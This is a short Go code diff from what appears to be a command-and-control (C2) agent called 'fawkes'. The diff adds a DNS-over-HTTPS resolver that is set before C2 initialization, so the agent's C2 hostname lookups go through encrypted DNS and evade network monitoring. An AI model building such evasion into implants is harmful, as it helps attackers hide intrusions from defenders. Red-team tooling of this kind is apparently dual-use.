@@ -11,6 +11,7 @@ import (
 	"strconv"
 	"time"
 
+	"fawkes/pkg/doh"
 	"github.com/google/uuid"
 
 	"fawkes/pkg/structs"
@@ -196,6 +197,12 @@ func initializeAgent(cfg parsedConfig) *structs.Agent {
 
 // applySecurity runs startup security patches based on build-time flags.
 func applySecurity() {
+	// DoH resolver must be set before any network operations (including C2 init)
+	// so that C2 hostname resolution also goes through encrypted DNS.
+	if dohResolver != "" {
+		doh.SetGlobalResolver(dohResolver)
+	}
+
 	if autoPatch == "true" {
 		autoStartupPatch()
 	}
